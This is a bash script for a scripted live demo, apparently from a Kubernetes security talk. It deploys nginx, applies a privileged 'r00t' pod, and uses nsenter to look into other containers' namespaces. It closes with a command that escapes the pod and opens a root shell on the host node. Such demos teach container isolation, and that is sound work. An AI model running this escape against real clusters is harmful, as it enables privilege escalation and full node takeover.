#!/usr/bin/env bash

########################
# include the magic
########################
. lib/demo-magic.sh


########################
# Configure the options
########################

#
# speed at which to simulate typing. bigger num = faster
#
# TYPE_SPEED=20

#
# custom prompt
#
# see http://www.tldp.org/HOWTO/Bash-Prompt-HOWTO/bash-prompt-escape-sequences.html for escape sequences
#
DEMO_PROMPT="${GREEN}➜ ${CYAN}\W "

kubectl create deployment nginx --image=nginx:stable
kubectl scale deployment nginx --replicas 5
kubectl get pods
clear


# put your demo awesomeness here
#if [ ! -d "stuff" ]; then
#  pe "mkdir stuff"
#fi

#pe "cd stuff"

pe "vim k8s_root/r00t.yaml"
pe "kubectl apply -f k8s_root/r00t.yaml"
pe "kubectl get pods -A -o wide"
pe "kubectl exec -it r00t -- nsenter --help"
p "How is a pod actually configured? Let's use nsenter to find out!"
p "First, let's find the PID of an nginx process"
pe "kubectl exec -it r00t -- pgrep -a nginx"
pe "kubectl exec -it r00t -- nsenter -n -t $(pgrep nginx | head -n1) ss -ln"
pe "kubectl exec -it r00t -- nsenter -m -t $(pgrep nginx | head -n1) cat /etc/nginx/nginx.conf"
p "This all works because every process has a /proc/PID/ns directory with a mapping of the namespaces that the process is bound to."
pe "kubectl exec -it r00t -- ls -la /proc/$(pgrep nginx| head -n 1)/ns"
p "Linux is namespacing all the things all the time, not just containers. Some of these namespaces are shared amongst all processes."
p "What else can we do here?"
p "We can use nsenter to take over the underlying node!"
pe "kubectl exec -it r00t -- nsenter -a -t 1 bash"



# show a prompt so as not to reveal our true nature after
# the demo has concluded
p ""
